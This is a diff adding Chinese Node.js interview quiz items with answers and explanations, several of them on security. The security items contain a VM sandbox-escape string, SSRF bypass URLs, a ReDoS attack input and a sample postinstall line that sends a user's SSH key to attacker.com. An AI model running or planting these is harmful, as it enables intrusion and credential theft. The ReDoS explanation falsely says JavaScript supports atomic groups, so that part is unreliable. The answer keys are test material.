+      "explanation": "这道题考察gRPC在Node.js中的应用和底层技术原理。\\n\\n**gRPC核心特性**：\\n\\n1. **HTTP/2传输层**：\\n   - 多路复用：单连接并发多请求\\n   - 双向流：支持服务端/客户端流\\n   - 头部压缩：HPACK算法\\n   - 二进制分帧：更高效传输\\n\\n2. **Protocol Buffers**：\\n   - 二进制序列化格式\\n   - 强类型Schema定义\\n   - 向前/向后兼容\\n   - 多语言代码生成\\n\\n**性能对比**：\\n选项A虽然正确指出二进制格式，但说\\\"快\\\"过于简化。\\n\\n实际性能因素：\\n- 序列化速度：Protobuf通常更快\\n- 数据大小：Protobuf更小（3-10倍）\\n- 但需要Schema预定义\\n- JSON更灵活，无需Schema\\n\\n**Protocol Buffers独立使用**：\\n选项C错误。Protocol Buffers完全可以独立使用：\\n```javascript\\nconst protobuf = require('protobufjs');\\n\\nconst root = protobuf.loadSync('user.proto');\\nconst User = root.lookupType('User');\\n\\n// 独立序列化\\nconst buffer = User.encode({ id: 1, name: 'Alice' }).finish();\\nconst decoded = User.decode(buffer);\\n```\\n\\n**gRPC流式RPC实现**：\\nNode.js中gRPC流使用stream.Duplex的子类：\\n```javascript\\n// 服务端流\\nserver.getUser(request, (call) => {\\n  call.write(user1);\\n  call.write(user2);\\n  call.end();\\n});\\n\\n// 客户端调用\\nconst call = client.getUser(request);\\ncall.on('data', (user) => console.log(user));\\ncall.on('end', () => console.log('done'));\\n```\\n\\n选项D不够准确，不是简单的EventEmitter。\\n\\n**工程实践建议**：\\n1. 微服务内部通信使用gRPC\\n2. 外部API使用REST/GraphQL\\n3. 使用grpc-tools自动生成代码\\n4. 配置健康检查和负载均衡",
+      "wrong_options_analysis": {
+        "A": "虽然Protobuf确实使用二进制格式且通常更快，但这个描述过于简化。性能取决于具体场景：小消息可能差异不大，大消息和嵌套结构Protobuf优势明显。而且'快'包括序列化速度和传输速度两方面。",
+        "C": "Protocol Buffers完全可以独立于gRPC使用，只是序列化格式。它可以用于消息队列、文件存储、任何需要高效序列化的场景。gRPC只是使用它的RPC框架之一。",
+        "D": "gRPC流在Node.js中使用的是Stream接口（stream.Duplex的子类），这比EventEmitter更高级。虽然Stream内部使用EventEmitter，但描述为'使用EventEmitter实现'不够准确。"
+      },
+      "knowledge_point": "gRPC_Protocol_Buffers",
+      "reference_link": "https://grpc.io/docs/languages/node/"
+    },
+    {
+      "id": "node-senior-020",
+      "type": "multiple_choice",
+      "difficulty": "senior",
+      "tags": ["微服务", "服务发现", "Consul"],
+      "source_company": "Meituan",
+      "score": 10,
+      "title": "服务发现机制",
+      "content": "关于微服务架构中的服务发现机制，以下说法正确的是？\\n\\n服务发现是微服务架构的核心基础设施。",
+      "options": [
+        {
+          "id": "A",
+          "text": "客户端发现模式中，客户端直接查询服务注册中心，自行决定路由"
+        },
+        {
+          "id": "B",
+          "text": "服务端发现模式通过Load Balancer代理，客户端只知道LB地址"
+        },
+        { "id": "C", "text": "Consul支持健康检查、KV存储和Service Mesh功能" },
+        { "id": "D", "text": "etcd使用Raft协议保证一致性，适合强一致性场景" },
+        { "id": "E", "text": "服务发现只解决服务寻址问题，不关心负载均衡" }
+      ],
+      "correct_answer": ["A", "B", "C", "D"],
+      "explanation": "这道题系统考察服务发现的架构模式和常用工具。\\n\\n**两种发现模式对比**：\\n\\n**客户端发现模式**：\\n```\\n客户端 → 服务注册中心查询 → 获取服务实例列表 → 客户端负载均衡 → 目标服务\\n```\\n\\n优点：\\n- 无额外网络跳转\\n- 客户端可定制负载均衡策略\\n\\n缺点：\\n- 客户端需要实现发现逻辑\\n- 语言绑定复杂度\\n\\n**服务端发现模式**：\\n```\\n客户端 → Load Balancer → 服务注册中心查询 → 负载均衡 → 目标服务\\n```\\n\\n优点：\\n- 客户端简单\\n- 统一入口\\n\\n缺点：\\n- 多一跳网络\\n- LB可能成为瓶颈\\n\\n**Consul功能特性**：\\n- 服务注册与发现\\n- 健康检查（TCP/HTTP/Script）\\n- KV存储\\n- Service Mesh（Connect功能）\\n- Web UI\\n- DNS接口\\n\\n**etcd特性**：\\n- 基于Raft协议\\n- 强一致性保证\\n- Kubernetes默认使用\\n- Watch机制支持变更通知\\n\\n**服务发现与负载均衡**：\\n选项E错误。服务发现通常集成负载均衡能力：\\n- 客户端发现：客户端内置负载均衡\\n- 服务端发现：LB提供负载均衡\\n\\n**Node.js集成示例**：\\n```javascript\\n// Consul客户端\\nconst Consul = require('consul');\\nconst consul = new Consul();\\n\\n// 注册服务\\nconsul.agent.service.register({\\n  name: 'my-service',\\n  address: '192.168.1.100',\\n  port: 3000,\\n  check: {\\n    http: 'http://192.168.1.100:3000/health',\\n    interval: '10s'\\n  }\\n});\\n\\n// 发现服务\\nconsul.catalog.service.nodes('target-service', (err, services) => {\\n  // 选择实例，负载均衡\\n});\\n```\\n\\n**工程实践建议**：\\n1. 评估一致性与可用性需求选择工具\\n2. 实现健康检查和自动注销\\n3. 考虑Service Mesh方案简化开发\\n4. 多数据中心场景选择Consul",
+      "exclusion_analysis": {
+        "E": "服务发现通常与负载均衡紧密配合。客户端发现模式中，客户端获取实例列表后需要执行负载均衡算法选择实例；服务端发现模式中，Load Balancer承担负载均衡职责。服务发现不只是寻址。"
+      },
+      "knowledge_point": "Service_Discovery_Patterns",
+      "reference_link": "https://developerconsul.io/docs/concepts/service-discovery.html"
+    },
+    {
+      "id": "node-senior-021",
+      "type": "single_choice",
+      "difficulty": "senior",
+      "tags": ["微服务", "Circuit Breaker", "熔断降级"],
+      "source_company": "Alibaba",
+      "score": 8,
+      "title": "熔断器模式实现",
+      "content": "关于熔断器（Circuit Breaker）模式，以下描述正确的是？\\n\\n```javascript\\nconst CircuitBreaker = require('opossum');\\n\\nconst breaker = new CircuitBreaker(riskyService, {\\n  timeout: 3000,\\n  errorThresholdPercentage: 50,\\n  resetTimeout: 30000\\n});\\n```",
+      "options": [
+        {
+          "id": "A",
+          "text": "熔断器有三个状态：Closed（正常）、Open（熔断）、Half-Open（探测）"
+        },
+        { "id": "B", "text": "Open状态下，所有请求都会直接成功返回缓存结果" },
+        {
+          "id": "C",
+          "text": "errorThresholdPercentage表示错误数量阈值，超过后触发熔断"
+        },
+        { "id": "D", "text": "resetTimeout后熔断器自动恢复到Closed状态" }
+      ],
+      "correct_answer": "A",
+      "explanation": "这道题深入考察熔断器模式的状态机和关键参数。\\n\\n**熔断器状态机**：\\n\\n```\n     失败率超阈值                成功\\nClosed ───────────→ Open ───────────→ Closed\\n  ↑                   │                   ↑\\n  │                   │ resetTimeout      │\\n  │                   ↓                   │\\n  └───────────── Half-Open ──────────────┘\\n              失败则返回Open\\n```\\n\\n**三状态详解**：\\n\\n1. **Closed（关闭）**：\\n   - 正常状态\\n   - 请求正常转发\\n   - 统计成功/失败率\\n\\n2. **Open（打开）**：\\n   - 熔断状态\\n   - 请求直接失败（fallback）\\n   - 等待resetTimeout\\n\\n3. **Half-Open（半开）**：\\n   - 探测状态\\n   - 允许部分请求通过\\n   - 成功则恢复Closed\\n   - 失败则返回Open\\n\\n**选项B错误**：Open状态请求直接失败或执行fallback，不是返回缓存结果。\\n\\n**关键参数解析**：\\n\\n```javascript\\nconst options = {\\n  timeout: 3000,              // 单次请求超时\\n  errorThresholdPercentage: 50, // 错误百分比阈值\\n  volumeThreshold: 5,         // 最小请求数\\n  resetTimeout: 30000         // Open状态持续时间\\n};\\n```\\n\\n**errorThresholdPercentage**：\\n选项C描述不准确。是错误\\\"百分比\\\"，不是错误数量。需要达到最小请求数（volumeThreshold）后，错误率超过阈值才触发熔断。\\n\\n**resetTimeout后行为**：\\n选项D错误。resetTimeout后进入Half-Open状态，不是直接Closed。需要探测请求成功才能恢复Closed。\\n\\n**工程实践建议**：\\n1. 合理设置timeout和阈值\\n2. 实现有意义的fallback逻辑\\n3. 监控熔断器状态变化\\n4. 结合重试和超时策略",
+      "wrong_options_analysis": {
+        "B": "Open状态下请求直接失败或执行预设的fallback函数，而不是返回缓存结果。熔断的目的是快速失败，避免资源浪费在已知会失败的请求上。",
+        "C": "errorThresholdPercentage是错误百分比阈值，如50表示50%的错误率。还需要配合volumeThreshold（最小请求数）一起判断。仅有错误数量是不够的。",
+        "D": "resetTimeout后熔断器进入Half-Open状态，允许探测请求通过。只有探测请求成功才会恢复到Closed状态。如果探测失败，会重新进入Open状态。"
+      },
+      "knowledge_point": "Circuit_Breaker_Pattern",
+      "reference_link": "https://martinfowler.com/bliki/CircuitBreaker.html"
+    },
+    {
+      "id": "node-senior-022",
+      "type": "single_choice",
+      "difficulty": "expert",
+      "tags": ["Serverless", "冷启动", "V8快照"],
+      "source_company": "Google",
+      "score": 10,
+      "title": "Serverless冷启动优化",
+      "content": "关于Node.js在Serverless环境中的冷启动优化，以下描述正确的是？\\n\\n冷启动是Serverless架构的主要性能挑战。",
+      "options": [
+        {
+          "id": "A",
+          "text": "V8快照可以跳过JavaScript解析和编译，直接加载预编译的堆内存"
+        },
+        {
+          "id": "B",
+          "text": "Provisioned Concurrency通过预热实例解决冷启动，但增加成本"
+        },
+        { "id": "C", "text": "冷启动只影响首次请求，后续请求不会有延迟问题" },
+        { "id": "D", "text": "使用更小的npm包可以显著减少冷启动时间" }
+      ],
+      "correct_answer": "B",
+      "explanation": "这道题深入考察Serverless冷启动的原理和优化策略。\\n\\n**冷启动阶段分解**：\\n\\n```\\n1. 资源分配（几十~几百ms）\\n2. 运行时初始化（Node.js启动）\\n3. 代码加载和解析\\n4. 依赖初始化\\n5. Handler执行\\n```\\n\\n**V8快照原理**：\\n选项A描述了V8快照的概念，但Node.js默认已经有内置快照，用户自定义快照支持有限。\\n\\nV8快照工作原理：\\n- 启动时解析JavaScript并生成字节码\\n- 将堆内存序列化到快照文件\\n- 后续启动直接加载快照\\n- 跳过解析和初始编译\\n\\nNode.js 12+有内置快照，但自定义快照需要编译Node.js源码。\\n\\n**Provisioned Concurrency**：\\n选项B正确。AWS Lambda的功能：\\n\\n```bash\\naws lambda put-provisioned-concurrency-config \\\\\\n  --function-name my-function \\\\\\n  --provisioned-concurrent-executions 10\\n```\\n\\n效果：\\n- 预热指定数量的实例\\n- 消除冷启动延迟\\n- 按预热的内存和时间计费\\n- 成本与性能的权衡\\n\\n**冷启动的持续影响**：\\n选项C错误。冷启动不限于首次请求：\\n- 实例空闲超时后被回收\\n- 并发增长时创建新实例\\n- 部署更新后重新冷启动\\n\\n**代码体积优化**：\\n选项D有一定道理但过于绝对。代码体积影响冷启动，但：\\n- 影响程度取决于具体场景\\n- 不是唯一或最重要的因素\\n- 依赖数量和初始化逻辑同样重要\\n\\n**全面优化策略**：\\n\\n```javascript\\n// 1. 延迟加载依赖\\nlet heavyModule;\\nexports.handler = async (event) => {\\n  if (!heavyModule) {\\n    heavyModule = require('heavy-module');\\n  }\\n  // ...\\n};\\n\\n// 2. 减少依赖\\n// 使用轻量级替代\\n\\n// 3. 使用Layer共享依赖\\n// 4. 优化初始化逻辑\\n```\\n\\n**工程实践建议**：\\n1. 关键路径使用Provisioned Concurrency\\n2. 精简依赖和代码体积\\n3. 延迟加载非必要模块\\n4. 利用Layer共享依赖\\n5. 监控冷启动频率和延迟",
+      "wrong_options_analysis": {
+        "A": "虽然V8快照确实可以跳过解析和编译，但Node.js的默认快照已经存在。用户自定义快照需要重新编译Node.js，这在Serverless环境中通常不可行。这不是实用的优化手段。",
+        "C": "冷启动不限于首次请求。实例在空闲一段时间后会被回收，下次请求需要重新冷启动。并发量突增也会触发新实例的冷启动。所以冷启动是持续可能发生的。",
+        "D": "代码体积确实影响冷启动，但不是唯一因素。依赖的初始化逻辑、I/O操作等同样重要。有时一个小依赖的初始化可能比大依赖更耗时。需要全面分析。"
+      },
+      "knowledge_point": "Serverless_Cold_Start",
+      "reference_link": "https://aws.amazon.com/blogs/compute/operating-lambda-performance-optimization-part-1/"
+    },
+    {
+      "id": "node-senior-023",
+      "type": "multiple_choice",
+      "difficulty": "senior",
+      "tags": ["WebSocket", "ws库", "高并发"],
+      "source_company": "Tencent",
+      "score": 10,
+      "title": "WebSocket高并发架构",
+      "content": "关于Node.js WebSocket高并发架构，以下说法正确的是？\\n\\n使用ws库构建WebSocket服务。",
+      "options": [
+        {
+          "id": "A",
+          "text": "ws库使用ws模块的WebSocketServer处理连接，支持perMessageDeflate压缩"
+        },
+        {
+          "id": "B",
+          "text": "心跳机制用于检测死连接，应客户端发起ping、服务端响应pong"
+        },
+        {
+          "id": "C",
+          "text": "分布式WebSocket需要使用Redis Adapter实现消息广播"
+        },
+        { "id": "D", "text": "单个Node.js进程可以轻松支持百万级WebSocket连接" },
+        { "id": "E", "text": "WebSocket连接可以复用HTTP握手，无需额外端口" }
+      ],
+      "correct_answer": ["A", "C", "E"],
+      "explanation": "这道题系统考察WebSocket高并发架构的核心技术和最佳实践。\\n\\n**ws库特性**：\\n\\nws是Node.js最流行的WebSocket实现：\\n\\n```javascript\\nconst WebSocket = require('ws');\\nconst wss = new WebSocket.Server({\\n  port: 8080,\\n  perMessageDeflate: {  // 启用压缩\\n    zlibDeflateOptions: { level: 3 },\\n    threshold: 1024  // 超过1KB才压缩\\n  }\\n});\\n```\\n\\n选项A正确。压缩可以减少传输数据量，但有CPU开销。\\n\\n**心跳机制**：\\n\\n选项B错误。正确做法是：\\n- 服务端发起ping（或客户端发起，视协议）\\n- 但更重要的是服务端需要主动检测\\n\\n```javascript\\n// 服务端心跳检测\\nconst heartbeat = () => {\\n  wss.clients.forEach((ws) => {\\n    if (ws.isAlive === false) {\\n      return ws.terminate();\\n    }\\n    ws.isAlive = false;\\n    ws.ping();  // 服务端发起ping\\n  });\\n};\\n\\nsetInterval(heartbeat, 30000);\\n\\nwss.on('connection', (ws) => {\\n  ws.isAlive = true;\\n  ws.on('pong', () => ws.isAlive = true);\\n});\\n```\\n\\n**分布式架构**：\\n\\n选项C正确。多实例需要消息同步：\\n\\n```javascript\\nconst Redis = require('ioredis');\\nconst redisPub = new Redis();\\nconst redisSub = new Redis();\\n\\n// 发布消息\\nredisPub.publish('ws:broadcast', JSON.stringify({ event, data }));\\n\\n// 订阅并广播\\nredisSub.subscribe('ws:broadcast', (msg) => {\\n  wss.clients.forEach(client => {\\n    if (client.readyState === WebSocket.OPEN) {\\n      client.send(msg);\\n    }\\n  });\\n});\\n```\\n\\n**连接数量限制**：\\n\\n选项D错误。单进程百万连接理论上可能，但：\\n- 需要调整系统限制（ulimit -n）\\n- 需要大量内存\\n- 需要优化GC\\n\\n实际推荐：\\n- 单进程10万-50万连接\\n- 使用Cluster多进程\\n- 监控内存使用\\n\\n**HTTP复用**：\\n\\n选项E正确。WebSocket通过HTTP Upgrade升级：\\n\\n```javascript\\nconst http = require('http');\\nconst server = http.createServer(app);\\nconst wss = new WebSocket.Server({ server });  // 复用HTTP服务器\\n```\\n\\n**工程实践建议**：\\n1. 启用心跳检测\\n2. 使用Cluster扩展\\n3. Redis Pub/Sub实现跨实例通信\\n4. 监控连接数和内存\\n5. 实现优雅关闭",
+      "exclusion_analysis": {
+        "B": "心跳机制的描述不准确。服务端应该主动发起ping来检测死连接，客户端响应pong。这和WebSocket协议的默认行为不同——协议层的pong是自动响应的，应用层心跳需要自己实现逻辑。",
+        "D": "单进程支持百万连接理论上可行，但需要大量调优：系统文件描述符限制、TCP内存、Node.js内存等。实际生产环境单进程10-50万是更合理的上限，超过这个数应该使用Cluster扩展。"
+      },
+      "knowledge_point": "WebSocket_High_Concurrency",
+      "reference_link": "https://github.com/websockets/ws"
+    },
+    {
+      "id": "node-senior-024",
+      "type": "single_choice",
+      "difficulty": "expert",
+      "tags": ["安全", "VM沙箱", "原型链污染"],
+      "source_company": "ByteDance",
+      "score": 10,
+      "title": "VM沙箱逃逸防护",
+      "content": "关于Node.js VM模块的沙箱机制和逃逸防护，以下描述正确的是？\\n\\n```javascript\\nconst vm = require('vm');\\n\\n// 尝试创建安全沙箱\\nconst sandbox = {\\n  result: null\\n};\\n\\nvm.runInNewContext('result = this.constructor.constructor(\\\"return process\\\")()', sandbox);\\n```",
+      "options": [
+        {
+          "id": "A",
+          "text": "VM模块创建的沙箱完全隔离，上述代码无法访问process"
+        },
+        {
+          "id": "B",
+          "text": "通过this.constructor.constructor可以获取Function构造函数，逃逸沙箱访问主上下文"
+        },
+        { "id": "C", "text": "使用vm.Context可以完全防止原型链逃逸" },
+        {
+          "id": "D",
+          "text": "vm2库已完全解决沙箱逃逸问题，推荐用于执行不受信任代码"
+        }
+      ],
+      "correct_answer": "B",
+      "explanation": "这道题深入考察VM沙箱的安全边界和常见的逃逸方式。\\n\\n**VM沙箱的本质**：\\nVM模块创建的沙箱并非真正的隔离环境，而是：\\n- 创建一个独立的global对象\\n- 但原型链仍然连接到主上下文\\n- 通过原型链可以逃逸访问主上下文\\n\\n**逃逸原理解析**：\\n\\n```javascript\\n// 示例中的逃逸过程\\nconst code = 'result = this.constructor.constructor(\\\"return process\\\")()';\\n\\n// 步骤分解：\\n// 1. this 指向 sandbox 对象\\n// 2. this.constructor → Object 构造函数\\n// 3. this.constructor.constructor → Function 构造函数\\n// 4. Function('return process')() → 在主上下文执行，返回 process\\n```\\n\\n**为什么能逃逸**：\\n- sandbox对象的原型是Object.prototype\\n- Object.prototype.constructor是Object\\n- Object.constructor是Function\\n- Function在主上下文执行代码\\n\\n**防护措施**：\\n\\n1. **创建无原型对象**：\\n```javascript\\nconst sandbox = Object.create(null);\\n// 没有原型链，无法通过constructor逃逸\\n```\\n\\n2. **冻结原型**：\\n```javascript\\nObject.freeze(Object.prototype);\\n```\\n\\n3. **使用vm.Module**（Node.js新API）：\\n更严格的隔离机制。\\n\\n**vm2的状态**：\\n选项D错误。vm2曾被认为更安全，但：\\n- 2023年已被标记为deprecated\\n- 仍存在已知逃逸漏洞\\n- 作者推荐使用isolated-vm\\n\\n**最佳实践**：\\n\\n执行不受信任代码的方案选择：\\n\\n1. **isolated-vm**：\\n```javascript\\nconst ivm = require('isolated-vm');\\nconst isolate = new ivm.Isolate();\\nconst context = isolate.createContextSync();\\n// 真正的V8 isolate隔离\\n```\\n\\n2. **子进程隔离**：\\n- 使用独立的Node.js进程\\n- 限制权限和资源\\n\\n3. **容器隔离**：\\n- Docker容器\\n- gVisor等沙箱技术\\n\\n**工程实践建议**：\\n1. 避免使用vm执行不受信任代码\\n2. 必要时使用isolated-vm\\n3. 考虑进程/容器级隔离\\n4. 限制资源（CPU、内存、时间）",
+      "wrong_options_analysis": {
+        "A": "VM沙箱并不完全隔离。示例代码通过原型链成功访问到主上下文的process对象，证明沙箱可被逃逸。这是VM模块的已知安全问题。",
+        "C": "vm.Context本身并不能防止原型链逃逸。Context只是创建了一个独立的global对象，但原型链连接仍然存在。需要手动处理原型链才能防止逃逸。",
+        "D": "vm2已被标记为deprecated，且存在已知的安全漏洞。作者明确表示不再维护，推荐使用isolated-vm。vm2不能被视为安全解决方案。"
+      },
+      "knowledge_point": "VM_Sandbox_Escape",
+      "reference_link": "https://nodejs.org/api/vm.html#vm_what_does_it_mean_to_contextify_an_object"
+    },
+    {
+      "id": "node-senior-025",
+      "type": "multiple_choice",
+      "difficulty": "senior",
+      "tags": ["安全", "SSRF", "DNS重绑定"],
+      "source_company": "Alibaba",
+      "score": 10,
+      "title": "SSRF防御策略",
+      "content": "关于服务器端请求伪造（SSRF）的防御策略，以下哪些是有效的？\\n\\n场景：用户输入URL，服务端发起HTTP请求获取内容。",
+      "options": [
+        {
+          "id": "A",
+          "text": "解析URL后检查hostname是否为内网IP（如127.0.0.1、10.x.x.x、172.16-31.x.x、192.168.x.x）"
+        },
+        {
+          "id": "B",
+          "text": "使用DNS重绑定检测：发起请求前和请求后都验证IP地址"
+        },
+        { "id": "C", "text": "在DNS解析阶段阻止内网IP解析" },
+        { "id": "D", "text": "使用IP白名单替代黑名单，只允许访问特定域名" },
+        { "id": "E", "text": "设置请求超时和响应大小限制" }
+      ],
+      "correct_answer": ["A", "B", "D", "E"],
+      "explanation": "这道题系统考察SSRF攻击的防御策略，每种策略都有其适用场景和局限。\\n\\n**SSRF攻击向量**：\\n\\n1. **直接访问内网**：\\n```\\nhttp://127.0.0.1:8080/admin\\nhttp://169.254.169.254/latest/meta-data  // AWS元数据\\n```\\n\\n2. **DNS重绑定**：\\n```\\n// 首次DNS解析返回公网IP（通过校验）\\n// 后续请求时DNS返回内网IP\\n```\\n\\n3. **URL解析绕过**：\\n```\\nhttp://example.com@127.0.0.1\\nhttp://127.0.0.1.example.com\\n```\\n\\n**各防御策略分析**：\\n\\n**选项A - IP黑名单检查**：\\n```javascript\\nconst isPrivateIP = (ip) => {\\n  const privateRanges = [\\n    '127.0.0.0/8',\\n    '10.0.0.0/8',\\n    '172.16.0.0/12',\\n    '192.168.0.0/16',\\n    '169.254.0.0/16'  // Link-local\\n  ];\\n  // 检查IP是否在私有范围内\\n};\\n```\\n有效但需要处理多种绕过方式。\\n\\n**选项B - DNS重绑定检测**：\\n```javascript\\nconst dns = require('dns').promises;\\n\\nasync function safeRequest(url) {\\n  const hostname = new URL(url).hostname;\\n  const ips1 = await dns.resolve4(hostname);\\n  // 检查IP\\n  const response = await fetch(url);\\n  const ips2 = await dns.resolve4(hostname);\\n  // 检查IP是否变化\\n  if (JSON.stringify(ips1) !== JSON.stringify(ips2)) {\\n    throw new Error('DNS rebinding detected');\\n  }\\n}\\n```\\n\\n**选项D - 白名单策略**：\\n```javascript\\nconst allowedDomains = ['api.example.com', 'cdn.example.com'];\\n\\nfunction isAllowed(url) {\\n  const hostname = new URL(url).hostname;\\n  return allowedDomains.includes(hostname);\\n}\\n```\\n白名单比黑名单更安全，但灵活性较低。\\n\\n**选项E - 资源限制**：\\n- 防止资源耗尽\\n- 限制攻击面\\n- 防止大响应攻击\\n\\n**选项C的局限**：\\nDNS解析阶段的拦截存在问题：\\n- 需要控制DNS服务器\\n- 可能影响正常业务\\n- 不够灵活\\n\\n**工程实践建议**：\\n1. 组合使用多种策略\\n2. 白名单优先于黑名单\\n3. 处理DNS重绑定\\n4. 监控异常请求模式\\n5. 限制请求频率和资源",
+      "exclusion_analysis": {
+        "C": "在DNS解析阶段阻止内网IP解析并不实用。这需要控制DNS服务器或修改系统DNS解析行为，在应用层难以实现。而且DNS重绑定攻击恰恰绕过了这种静态检查。应该是在应用层解析IP后再检查。"
+      },
+      "knowledge_point": "SSRF_Defense",
+      "reference_link": "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html"
+    },
+    {
+      "id": "node-senior-026",
+      "type": "single_choice",
+      "difficulty": "senior",
+      "tags": ["安全", "ReDoS", "正则表达式"],
+      "source_company": "Tencent",
+      "score": 8,
+      "title": "ReDoS正则回溯防御",
+      "content": "关于正则表达式拒绝服务攻击（ReDoS），以下描述正确的是？\\n\\n```javascript\\n// 危险的正则表达式示例\\nconst dangerousRegex = /^(a+)+$/;\\n\\n// 攻击输入\\nconst attackInput = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!';\\n// 尾部有一个不匹配字符'!'\\n```",
+      "options": [
+        {
+          "id": "A",
+          "text": "ReDoS利用正则引擎的贪婪匹配特性，指数级回溯导致CPU耗尽"
+        },
+        { "id": "B", "text": "使用非贪婪量词（*?或+?）可以完全避免ReDoS" },
+        {
+          "id": "C",
+          "text": "Node.js的RegExp引擎有内置超时机制，会自动中断长时间匹配"
+        },
+        { "id": "D", "text": "所有正则表达式都存在ReDoS风险，只是触发条件不同" }
+      ],
+      "correct_answer": "A",
+      "explanation": "这道题深入考察ReDoS攻击原理和防御策略。\\n\\n**ReDoS原理**：\\n\\n示例正则`/^(a+)+$/`的问题：\\n- 嵌套量词：外层+和内层+\\n- 输入'aaa...'时，有多种匹配方式\\n- 遇到不匹配字符时，需要回溯尝试所有可能\\n\\n**回溯复杂度分析**：\\n```\\n输入长度n，匹配方式数量：O(2^n)\\n\\n例如'aaaaa!'：\\n- a+ 可以匹配 1-5 个a\\n- 外层+ 可以有 1-5 组\\n- 组合方式指数增长\\n```\\n\\n**时间复杂度演示**：\\n```javascript\\nconst dangerousRegex = /^(a+)+$/;\\n\\n// 长度20：几毫秒\\n// 长度25：几秒\\n// 长度30：几分钟\\n// 长度35：几小时\\n```\\n\\n**危险模式特征**：\\n1. 嵌套量词：`(a+)+`、`(a|a?)+`\\n2. 交替重叠：`(a|aa)+`\\n3. 反向引用：`(a+) \\1`\\n\\n**防御策略**：\\n\\n1. **避免危险模式**：\\n```javascript\\n// 危险\\nconst bad = /^(a+)+$/;\\n\\n// 安全\\nconst good = /^a+$/;\\n```\\n\\n2. **使用原子组**（ES2018+）：\\n```javascript\\nconst safe = /^(?>a+)$/;\\n// 原子组匹配后不回溯\\n```\\n\\n3. **限制输入长度**：\\n```javascript\\nif (input.length > 100) throw new Error('Input too long');\\n```\\n\\n**选项B错误**：非贪婪量词不能避免ReDoS：\\n```javascript\\nconst stillDangerous = /^(a+?)+$/;\\n// 同样存在指数回溯\\n```\\n\\n**Node.js RegExp无超时**：\\n选项C错误。V8/Node.js没有正则超时机制，ReDoS会无限阻塞。\\n\\n**工程实践建议**：\\n1. 使用安全正则模式\\n2. 限制输入长度\\n3. 使用正则分析工具检测\\n4. 考虑使用正则超时库\\n5. 监控CPU使用率",
+      "wrong_options_analysis": {
+        "B": "非贪婪量词（*?或+?）并不能避免ReDoS。ReDoS的根本原因是嵌套量词导致的多种匹配路径，贪婪或非贪婪只是影响尝试顺序，不能减少回溯次数。示例中的 /^(a+?)+$/ 同样危险。",
+        "C": "Node.js/V8的RegExp引擎没有内置超时机制。正则匹配会一直执行直到完成或进程被外部终止。这是ReDoS攻击有效的原因。需要应用层实现超时控制。",
+        "D": "并非所有正则都有ReDoS风险。安全的正则（如 /^a+$/）在最坏情况下也是线性时间复杂度。只有具有嵌套量词、重叠交替等特定模式的正则才存在指数回溯风险。"
+      },
+      "knowledge_point": "ReDoS_Prevention",
+      "reference_link": "https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS"
+    },
+    {
+      "id": "node-senior-027",
+      "type": "multiple_choice",
+      "difficulty": "senior",
+      "tags": ["安全", "npm", "供应链安全"],
+      "source_company": "Google",
+      "score": 10,
+      "title": "npm依赖安全实践",
+      "content": "关于npm依赖安全，以下哪些是有效的安全实践？",
+      "options": [
+        {
+          "id": "A",
+          "text": "使用npm audit定期检查已知漏洞，并使用npm audit fix修复"
+        },
+        {
+          "id": "B",
+          "text": "提交package-lock.json到版本控制，确保依赖版本一致性"
+        },
+        { "id": "C", "text": "使用npm shrinkwrap锁定依赖版本，防止意外升级" },
+        {
+          "id": "D",
+          "text": "使用私库（如Verdaccio）代理所有npm包，控制可访问的包"
+        },
+        {
+          "id": "E",
+          "text": "使用npm install --ignore-scripts跳过postinstall脚本，防止恶意代码执行"
+        }
+      ],
+      "correct_answer": ["A", "B", "D", "E"],
+      "explanation": "这道题系统考察npm生态的安全最佳实践。\\n\\n**npm audit使用**：\\n\\n```bash\\n# 检查漏洞\\nnpm audit\\n\\n# 自动修复（可能升级版本）\\nnpm audit fix\\n\\n# 强制修复（可能破坏兼容性）\\nnpm audit fix --force\\n```\\n\\n**package-lock.json重要性**：\\n\\n锁定版本确保：\\n- 团队成员使用相同版本\\n- CI/CD环境一致\\n- 防止依赖篡改\\n\\n**npm shrinkwrap与package-lock**：\\n\\n选项C不准确。npm shrinkwrap（生成npm-shrinkwrap.json）和package-lock.json功能类似，但：\\n- npm 5+推荐使用package-lock.json\\n- shrinkwrap用于发布到npm的包\\n- 两者不应同时使用\\n\\n**私库Verdaccio**：\\n\\n```yaml\\n# Verdaccio配置\\npackages:\\n  '**':\\n    access: $authenticated\\n    publish: $authenticated\\n    proxy: npmjs\\n```\\n\\n好处：\\n- 控制可访问的包\\n- 缓存加速\\n- 发布私有包\\n- 审计下载记录\\n\\n**postinstall脚本风险**：\\n\\n恶意包示例：\\n```json\\n{\\n  \\\"scripts\\\": {\\n    \\\"postinstall\\\": \\\"curl attacker.com/steal?data=$(cat ~/.ssh/id_rsa)\\\"\\n  }\\n}\\n```\\n\\n使用--ignore-scripts：\\n```bash\\nnpm install --ignore-scripts\\n```\\n\\n**综合安全策略**：\\n\\n```javascript\\n// .npmrc\\nignore-scripts=true  // 默认忽略脚本\\n```\\n\\n```bash\\n# CI流程\\nnpm ci --ignore-scripts\\nnpm rebuild only-safe-packages\\n```\\n\\n**工程实践建议**：\\n1. 定期运行npm audit\\n2. 提交lock文件\\n3. 使用私库代理\\n4. 禁用不必要的脚本\\n5. 依赖审查（dependency review）\\n6. 使用Snyk等工具持续监控",
+      "exclusion_analysis": {
+        "C": "npm shrinkwrap在现代npm中与package-lock.json功能重复。npm 5+推荐使用package-lock.json，shrinkwrap主要用于发布到npm的包需要锁定依赖的场景。两者不应同时存在，使用package-lock.json更标准。"
+      },
+      "knowledge_point": "npm_Supply_Chain_Security",
+      "reference_link": "https://docs.npmjs.com/cli/v8/commands/npm-audit"
+    },
+    {
+      "id": "node-senior-028",
+      "type": "single_choice",
+      "difficulty": "expert",
+      "tags": ["libuv", "uv__io_poll", "源码级"],
+      "source_company": "ByteDance",
+      "score": 12,
+      "title": "libuv uv__io_poll实现原理",
+      "content": "关于libuv中uv__io_poll的实现，以下描述正确的是？\\n\\nuv__io_poll是libuv Event Loop中poll阶段的核心实现。",
+      "options": [
+        {
+          "id": "A",
+          "text": "uv__io_poll在Linux上使用epoll系统调用，在macOS上使用kqueue"
+        },
+        {
+          "id": "B",
+          "text": "uv__io_poll只处理网络I/O事件，文件I/O通过线程池处理"
+        },
+        {
+          "id": "C",
+          "text": "uv__io_poll是阻塞调用，直到有I/O事件或超时才返回"
+        },
